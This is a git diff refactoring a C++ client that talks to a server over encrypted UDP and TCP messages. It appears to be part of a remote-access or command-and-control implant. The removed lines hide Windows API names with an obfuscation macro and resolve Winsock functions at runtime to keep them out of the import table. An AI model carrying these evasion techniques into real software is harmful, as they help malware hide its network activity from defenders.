@@ -1,23 +1,13 @@
-#include "../Headers/client.h"
-#include "../Headers/obfuscate.h"
-#include "../Headers/procutils.h"
-#include "../Headers/aes.hpp"
+#include "../../Headers/client.h"
+#include "../../Headers/obfuscate.h"
+#include "../../Headers/procutils.h"
 
 //#include <openssl/evp.h>
 //#include <openssl/aes.h>
 
-#define winsock32 std::string(HIDE("Ws2_32.dll"))
 
 Client::Client() {
-	LoadWSAFunctions();
-	OutputDebugStringA("Loaded WSA Functions");
-
-	WORD version = MAKEWORD(2, 2);
-	WSAData data = { 0 };
-	int success  = StartWSA(version, &data);
-
-	if ( success == 0 )
-		WSAInitialized = TRUE;
+	NetCommon::LoadWSAFunctions();
 }
 
 Client::~Client() {
@@ -28,28 +18,6 @@ Client::~Client() {
 }
 // TODO: CHANGE ADDR TO SERVER DNS
 
-VOID Client::LoadWSAFunctions() {
-	if ( WSAInitialized )
-		return;
-
-	HMODULE kernel32 = ProcessUtilities::GetModHandle(ProcessUtilities::freqDLLS::kernel32); // load winsock
-	ProcessUtilities::PPROCFN::_LoadLibrary load = ProcessUtilities::GetFunctionAddress<ProcessUtilities::PPROCFN::_LoadLibrary>(kernel32, std::string(HIDE("LoadLibraryA")));
-	
-	HMODULE WINSOCK = load(winsock32.c_str());
-
-	// function pointers from winsock
-	StartWSA	  = ProcessUtilities::GetFunctionAddress<_WSAStartup>(WINSOCK, std::string(HIDE("WSAStartup")));
-	BindSocket    = ProcessUtilities::GetFunctionAddress<_bind>(WINSOCK, std::string(HIDE("bind")));
-	CloseSocket   = ProcessUtilities::GetFunctionAddress<_closesocket>(WINSOCK, std::string(HIDE("closesocket")));
-	CreateSocket  = ProcessUtilities::GetFunctionAddress<_socket>(WINSOCK, std::string(HIDE("socket")));
-	Receive       = ProcessUtilities::GetFunctionAddress<_recv>(WINSOCK, std::string(HIDE("recv")));
-	SendTo        = ProcessUtilities::GetFunctionAddress<_sendto>(WINSOCK, std::string(HIDE("sendto")));
-	ReceiveFrom   = ProcessUtilities::GetFunctionAddress<_recvfrom>(WINSOCK, std::string(HIDE("recvfrom")));
-	Send          = ProcessUtilities::GetFunctionAddress<_send>(WINSOCK, std::string(HIDE("send")));
-	CleanWSA      = ProcessUtilities::GetFunctionAddress<_WSACleanup>(WINSOCK, std::string(HIDE("WSACleanup")));
-	ConnectSocket = ProcessUtilities::GetFunctionAddress<_connect>(WINSOCK, std::string(HIDE("connect")));
-}
-
 BOOL Client::Connect() {
 
 	// make request to udp server
@@ -59,7 +27,7 @@ BOOL Client::Connect() {
 
 	ClientRequest request = {};
 	request.action = ClientRequest::Action::CONNECT_CLIENT;
-	request.client = reinterpret_cast< void* >( this );
+	request.client = reinterpret_cast<void*>(this);
 
 	BOOL validServerResponse = UDPSendMessageToServer(request);
 	if ( !validServerResponse )
@@ -93,7 +61,7 @@ BOOL Client::SocketReady(SocketTypes type) const {
 		break;
 	}
 
-	return socketReady == TRUE && WSAInitialized;
+	return socketReady == TRUE && NetCommon::WSAInitialized;
 }
 
 BYTESTRING Client::EncryptClientRequest(ClientRequest req) const {
@@ -110,6 +78,21 @@ ServerRequest Client::DecryptServerRequest(BYTESTRING req) {
 	return DecryptInternetData<ServerRequest>(req);
 }
 
+UDPResponse Client::UDPRecvMessageFromServer() {
+	BYTESTRING responseBuffer;
+	responseBuffer.resize(1000);
+
+	int received = ReceiveFrom(this->UDPSocket, reinterpret_cast< char* >( responseBuffer.data() ), sizeof(responseBuffer), 0, NULL, NULL);
+	if ( received == SOCKET_ERROR )
+		return {};
+
+	// decrypt the udp response and cast it to UDPResponse
+	UDPResponse response = DecryptInternetData<UDPResponse>(responseBuffer);
+	if ( response.isValid ) this->ConnectedServer = response.TCPServer;
+
+	return response;
+}
+
 BOOL Client::UDPSendMessageToServer(ClientMessage message) {
 	if ( !SocketReady(UDP) )
 		return FALSE;
@@ -120,27 +103,11 @@ BOOL Client::UDPSendMessageToServer(ClientMessage message) {
 	if ( sent == SOCKET_ERROR )
 		return FALSE;
 
-	/*
-		Set up a UDPResponse buffer to receive information
-		from the server and interpret it as a struct
-	*/
-	BYTESTRING udpResponseBuffer;
-	udpResponseBuffer.resize(1000);
-	int received = ReceiveFrom(this->UDPSocket, reinterpret_cast<char*>(udpResponseBuffer.data()), sizeof(udpResponseBuffer), 0, NULL, NULL);
-	if ( received == SOCKET_ERROR )
-		return FALSE;
-
-	// decrypt the udp response and cast it to UDPResponse
-	UDPResponse response = DecryptInternetData<UDPResponse>(udpResponseBuffer);
-
-	// update connected server after receiving a udp response from the server
-	if (response.isValid) this->ConnectedServer = response.TCPServer;
-
-	return response.isValid;
+	return UDPRecvMessageFromServer().isValid;
 }
 
 BOOL Client::TCPSendMessageToServer(ClientMessage message) {
-	if ( !SocketReady(TCP) )
+	if ( !SocketReady(TCP) ) 
 		return FALSE;
 
 	BYTESTRING encryptedRequest = EncryptClientRequest(message);
